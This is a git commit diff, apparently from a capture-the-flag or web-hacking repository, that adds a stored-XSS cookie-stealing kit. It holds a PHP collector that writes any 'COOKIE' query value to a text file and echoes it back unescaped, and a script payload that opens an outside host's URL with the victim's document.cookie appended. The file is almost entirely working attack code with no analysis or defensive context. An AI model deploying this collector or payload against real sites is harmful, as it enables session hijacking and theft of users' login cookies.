0cf52c0bc59d190851cb420220872bbf6c428843
Azphereax <Azphereax@users.noreply.github.com>
2016-09-01 22:23:07 +0200

    Update and rename XSS - Stored 1 to XSS_1.php

---
+++ Web---Client/XSS_1.php
@@ -0,0 +1,21 @@
+
+#_# Server Side #_#
+
+<?php
+if (isset($_GET['COOKIE']) && !empty($_GET['COOKIE']))
+{
+  $cs=$_GET['COOKIE'];
+  $ck = fopen('atome.txt','a');
+  fputs($ck,$cs);
+  fclose($ck);
+  echo $cs;
+}
+?>
+
+#_# Client Side #_#
+
+<!--
+
+#_#PAYLOAD#_#   <script>window.open("http://ezpha.pe.hu/XSS_1.php?COOKIE="+document.cookie);</script>
+
+-->
